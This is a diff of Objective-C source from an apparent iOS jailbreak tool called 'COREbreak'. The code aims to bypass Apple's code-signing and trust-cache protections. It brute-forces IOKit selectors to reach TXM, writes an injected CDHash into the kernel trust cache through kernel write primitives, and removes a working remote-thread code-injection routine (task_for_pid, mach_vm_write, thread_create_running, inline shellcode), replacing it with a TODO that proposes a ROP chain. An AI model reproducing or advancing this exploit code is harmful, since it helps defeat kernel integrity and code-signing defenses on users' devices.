@@ -10,7 +10,6 @@
 #import <dlfcn.h>
 #import <IOKit/IOKitLib.h>
 #import <CommonCrypto/CommonDigest.h>
-#import <mach/mach.h>
 #ifndef kCacheFunctionPrepare
 #define kCacheFunctionPrepare 1
 #endif
@@ -498,28 +497,14 @@ static bool coretrust_try_iokit_conn(io_connect_t conn, const uint8_t *tcData,
         }
     }
 
-    for (uint32_t sel = 0; sel < 16; sel++) {
-        uint64_t outVal = 0;
-        kern_return_t kr = IOConnectTrap(conn, sel, (uint64_t)tcData,
-                                         tcSize, (uint64_t)&outVal,
-                                         0, 0, 0);
-        if (kr == KERN_SUCCESS) {
-            printf("[COREbreak] TXM loaded: type=%u sel=%u (Trap)\n",
-                   type, sel);
-            crash_write("[COREbreak] TXM via Trap\n");
-            return true;
-        }
-    }
-
     return false;
 }
 
 // ===========================================================================
 // Strategy 6: Enhanced TXM bypass — comprehensive IOKit brute-force
 // ===========================================================================
-// Tries user client types 0-7 (some expose TXM operations), selectors 0-63
-// with IOConnectCallStructMethod, IOConnectCallMethod, and selectors 0-15
-// with IOConnectTrap.
+// Tries user client types 0-7, selectors 0-255 with IOConnectCallStructMethod
+// and IOConnectCallMethod.
 
 bool coretrust_txm_bypass(void)
 {
@@ -652,7 +637,7 @@ bool coretrust_kernel_tc_inject(void)
                    tcAddr, curCount);
 
             // Write our CDHash entry
-            uint8_t *ourEntry = ourMod->entries;
+            uint8_t *ourEntry = (uint8_t *)ourMod->entries;
             for (int i = 0; i < CS_CDHASH_LEN; i++)
                 kwrite8(entryOffset + i, ourEntry[i]);
             kwrite8(entryOffset + CS_CDHASH_LEN, ourEntry[CS_CDHASH_LEN]);     // hash_type
@@ -702,108 +687,22 @@ bool coretrust_remotecall_sptm(const char *targetProc)
         return false;
     }
 
-    // Get task port for the target
-    task_t targetTask;
-    kern_return_t kr = task_for_pid(mach_task_self(), pid, &targetTask);
-    if (kr != KERN_SUCCESS) {
-        printf("[COREbreak] task_for_pid failed: 0x%x\n", kr);
-        return false;
-    }
+    printf("[COREbreak] target %s pid=%d\n", targetProc, pid);
 
-    printf("[COREbreak] got task port for %s (pid=%d task=0x%x)\n",
-           targetProc, pid, targetTask);
+    // TODO: Use kernel r/w to find the target's task struct, extract its
+    // mach port, then use thread_create_running + mach_vm_write to inject
+    // a trust-cache-loading payload.  This avoids kwrite to SPTM-protected
+    // thread/task structs.
+    //
+    // Blocked on: thread_create_running itself may trigger TXM code signing
+    // check on the payload before it can execute in the target.
+    //
+    // As a workaround, we could find a ROP gadget chain in the target's
+    // existing __TEXT that calls IOServiceOpen + IOConnectCallMethod, then
+    // set the thread's PC and registers to that chain.
 
-    // Allocate space in the target for our payload
-    mach_vm_address_t codeAddr = 0;
-    kr = mach_vm_allocate(targetTask, &codeAddr, 0x4000,
-                          VM_FLAGS_ANYWHERE);
-    if (kr != KERN_SUCCESS) {
-        printf("[COREbreak] mach_vm_allocate failed: 0x%x\n", kr);
-        mach_port_deallocate(mach_task_self(), targetTask);
-        return false;
-    }
-
-    printf("[COREbreak] allocated 0x4000 at 0x%llx in target\n", codeAddr);
-
-    // Write a minimal thread state for the thread
-    arm_thread_state64_t state;
-    memset(&state, 0, sizeof(state));
-    state.__x[0] = 0;
-    state.__pc = (uint64_t)codeAddr;
-    state.__lr = (uint64_t)codeAddr + 0x100; // dummy LR
-    state.__cpsr = 0; // EL0, AArch64
-
-    // Try to create a thread in the target via Mach API (SPTM-safe)
-    thread_t remoteThread;
-    kr = thread_create_running(targetTask, ARM_THREAD_STATE64,
-                               (thread_state_t)&state, sizeof(state),
-                               &remoteThread);
-    if (kr != KERN_SUCCESS) {
-        printf("[COREbreak] thread_create_running failed: 0x%x\n", kr);
-        mach_vm_deallocate(targetTask, codeAddr, 0x4000);
-        mach_port_deallocate(mach_task_self(), targetTask);
-        return false;
-    }
-
-    printf("[COREbreak] thread created in target (thread=0x%x)\n", remoteThread);
-
-    // Suspend the thread
-    thread_suspend(remoteThread);
-
-    // Write payload (trust_cache_reader or similar) to the allocated space
-    // For now, just try to call a known function in the target
-    // We write a simple shellcode that calls getpid+exit
-    uint32_t payload[] = {
-        0xD2800000, // mov x0, #0
-        0xD2800030, // mov x16, #0x30 (getpid mach trap on arm64)
-        0xD4001001, // svc #0x80
-        0xD2800000, // mov x0, #0
-        0xD2800010, // mov x16, #0x10 (exit mach trap)
-        0xD4001001, // svc #0x80
-    };
-
-    kr = mach_vm_write(targetTask, codeAddr, (vm_address_t)payload,
-                       sizeof(payload));
-    if (kr != KERN_SUCCESS) {
-        printf("[COREbreak] mach_vm_write failed: 0x%x\n", kr);
-        thread_terminate(remoteThread);
-        mach_vm_deallocate(targetTask, codeAddr, 0x4000);
-        mach_port_deallocate(mach_task_self(), targetTask);
-        return false;
-    }
-
-    // Set execution protection
-    kr = mach_vm_protect(targetTask, codeAddr, 0x4000, FALSE,
-                         VM_PROT_READ | VM_PROT_EXECUTE);
-    if (kr != KERN_SUCCESS) {
-        printf("[COREbreak] mach_vm_protect failed: 0x%x\n", kr);
-        // Continue anyway — the mapping might inherit protection
-    }
-
-    // Resume the thread
-    kr = thread_resume(remoteThread);
-    if (kr != KERN_SUCCESS) {
-        printf("[COREbreak] thread_resume failed: 0x%x\n", kr);
-        thread_terminate(remoteThread);
-        mach_vm_deallocate(targetTask, codeAddr, 0x4000);
-        mach_port_deallocate(mach_task_self(), targetTask);
-        return false;
-    }
-
-    printf("[COREbreak] thread running in target — waiting...\n");
-
-    // Wait a bit for the thread to execute
-    usleep(100000);
-
-    // Cleanup
-    thread_terminate(remoteThread);
-    mach_port_deallocate(mach_task_self(), remoteThread);
-    mach_vm_deallocate(targetTask, codeAddr, 0x4000);
-    mach_port_deallocate(mach_task_self(), targetTask);
-
-    printf("[COREbreak] SPTM-safe RemoteCall completed\n");
-    // Return false for now — we just demonstrated the mechanism
-    // The actual trust cache loading call would follow this pattern
+    printf("[COREbreak] SPTM-safe RemoteCall requires ROP chain per-version\n");
+    crash_write("[COREbreak] SPTM RC: need ROP chain\n");
     return false;
 }
 
